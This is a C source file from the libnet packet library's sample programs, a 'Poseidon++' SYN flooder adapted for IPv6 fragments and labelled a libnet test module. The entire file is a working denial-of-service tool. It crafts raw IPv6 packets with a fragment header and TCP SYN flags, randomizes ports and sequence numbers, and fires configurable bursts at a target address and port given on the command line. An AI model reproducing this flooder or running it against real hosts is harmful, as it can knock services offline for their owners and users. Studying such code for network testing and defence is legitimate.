/*
 *  $Id: synflood6_frag.c,v 1.1 2004/01/03 20:31:01 mike Exp $
 *
 *  Poseidon++ (c) 1996 - 2003 Mike D. Schiffman <mike@infonexus.com>
 *  SYN flooder rewritten for no good reason.  Again as libnet test module.
 *  Again for libnet 1.1.
 *  All rights reserved.
 *
 * Modifications for ipv6 by Stefan Schlott <stefan@ploing.de>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../include/config.h"
#endif
#include "./libnet_test.h"

struct t_pack
{
    struct libnet_ipv6_hdr ip;
    struct libnet_tcp_hdr tcp;
};


int
main(int argc, char **argv)
{
    struct libnet_in6_addr dst_ip;
    struct libnet_in6_addr src_ip;
    u_short dst_prt = 0;
    u_short src_prt = 0;
    libnet_t *l;
    libnet_ptag_t tcp, ip, ip_frag;
    char *cp;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int i, j, c, packet_amt, burst_int, burst_amt;
    char srcname[100], dstname[100];
    uint8_t payload[56];

    packet_amt  = 0;
    burst_int   = 0;
    burst_amt   = 1;
    tcp = ip_frag = ip = LIBNET_PTAG_INITIALIZER;

    printf("libnet 1.1 syn flooding: TCP IPv6 fragments [raw]\n");
    
    l = libnet_init(
            LIBNET_RAW6,                            /* injection type */
            NULL,                                   /* network interface */
            errbuf);                                /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }

    while((c = getopt(argc, argv, "t:a:i:b:")) != EOF)
    {
        switch (c)
        {
            case 't':
                if (!(cp = strrchr(optarg, '/')))
                {
                    usage(argv[0]);
                    exit(EXIT_FAILURE);
                }
                *cp++ = 0;
                dst_prt = (u_short)atoi(cp);
		dst_ip = libnet_name2addr6(l, optarg, 1);
                if (strncmp((char*)&dst_ip,
                   (char*)&in6addr_error,sizeof(in6addr_error))==0)
                {
                    fprintf(stderr, "Bad IPv6 address: %s\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;
            case 'a':
                packet_amt  = atoi(optarg);
                break;
            case 'i':
                burst_int   = atoi(optarg);
                break;
            case 'b':
                burst_amt   = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    src_ip = libnet_name2addr6(l, "0:0:0:0:0:0:0:1", LIBNET_DONT_RESOLVE);
    /* src_ip = libnet_name2addr6(l, 
       "3ffe:400:60:4d:250:fcff:fe2c:a9cd", LIBNET_DONT_RESOLVE);
	dst_prt = 113;
	dst_ip = libnet_name2addr6(l, "nathan.ip6.uni-ulm.de", LIBNET_RESOLVE);
	packet_amt = 1;
    */

    if (!dst_prt || strncmp((char*)&dst_ip,
       (char*)&in6addr_error,sizeof(in6addr_error))==0 || !packet_amt)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);
    libnet_addr2name6_r(src_ip, LIBNET_RESOLVE, srcname, sizeof(srcname));
    libnet_addr2name6_r(dst_ip, LIBNET_RESOLVE, dstname, sizeof(dstname));

    for(; burst_amt--;)
    {
        for (i = 0; i < packet_amt; i++)
        {
            for (j = 0; j < 56; j++) payload[j] = 'A' + ((char)(j % 26));

            tcp = libnet_build_tcp(
                src_prt = libnet_get_prand(LIBNET_PRu16),
                dst_prt,
                libnet_get_prand(LIBNET_PRu32),
                libnet_get_prand(LIBNET_PRu32),
                TH_SYN,
                libnet_get_prand(LIBNET_PRu16),
                0,
                0,
                LIBNET_TCP_H,
                NULL,
                0,
                l,
                tcp);
            if (tcp == -1)
            {
                fprintf(stderr, "Can't build or modify TCP header: %s\n",
                        libnet_geterror(l));
                return (EXIT_FAILURE);
            }

            ip_frag = libnet_build_ipv6_frag(
                IPPROTO_TCP,                  /* next header */
                0,                            /* reserved */
                0,                            /* frag bits */
                1,                            /* ip id */
                NULL,
                0,
                l,
                ip_frag);
            if (ip_frag == -1)
            {
                fprintf(stderr, "Can't build or modify TCP header: %s\n",
                        libnet_geterror(l));
                return (EXIT_FAILURE);
            }

            ip = libnet_build_ipv6(
                0, 0,
 	        LIBNET_TCP_H,
 	        IPPROTO_TCP,
	        64,
	        src_ip,
	        dst_ip,
                NULL,
                0,
                l,
                ip);
            if (ip == -1)
            {
                fprintf(stderr, "Can't build or modify TCP header: %s\n",
                        libnet_geterror(l));
                return (EXIT_FAILURE);
            }

            printf("%15s/%5d -> %15s/%5d\n", 
                   srcname,
                   ntohs(src_prt),
                   dstname,
                   dst_prt);

            c = libnet_write(l);
            if (c == -1)
            {
                fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
            }
#if !(__WIN32__)
            usleep(250);
#else
            Sleep(250);
#endif

        }
#if !(__WIN32__)
        sleep(burst_int);
#else
        Sleep(burst_int * 1000);
#endif
    }
    exit(EXIT_SUCCESS);
}


void
usage(char *nomenclature)
{
    fprintf(stderr,
        "\n\nusage: %s -t -a [-i -b]\n"
        "\t-t target, (ip6:address/port, e.g. ::1/23)\n"
        "\t-a number of packets to send per burst\n"
        "\t-i packet burst sending interval (defaults to 0)\n"
        "\t-b number packet bursts to send (defaults to 1)\n" , nomenclature);
}


/* EOF */
